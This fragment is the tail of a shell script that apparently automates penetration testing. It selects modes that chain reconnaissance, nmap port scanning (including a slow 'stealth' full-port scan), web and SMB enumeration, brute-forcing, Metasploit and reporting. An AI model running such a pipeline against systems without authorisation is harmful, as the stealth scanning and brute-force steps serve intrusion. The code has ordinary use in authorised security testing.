        phase_recon; phase_nmap; phase_brute; phase_report ;;
    --quick)
        phase_recon; phase_quick; phase_report ;;
    --stealth)
        phase_recon
        run "nmap -Pn $SCAN -T2 -p- $TARGET (stealth)"
        $SUDO nmap -Pn $SCAN -T2 -p- "$TARGET" -oN "$SESSION/nmap/nmap_2_fullports.txt" 2>/dev/null
        OPEN_PORTS=$(grep "^[0-9]" "$SESSION/nmap/nmap_2_fullports.txt" 2>/dev/null \
            | grep "open" | awk -F/ '{print $1}' | tr '\n' ',' | sed 's/,$//')
        ok "Open ports: ${OPEN_PORTS:-none}"
        set_flags "$SESSION/nmap/nmap_2_fullports.txt"
        phase_web; phase_smb; phase_brute; phase_msf; phase_report ;;
    *)
        phase_recon; phase_nmap; phase_web; phase_smb; phase_brute; phase_msf; phase_report ;;
esac
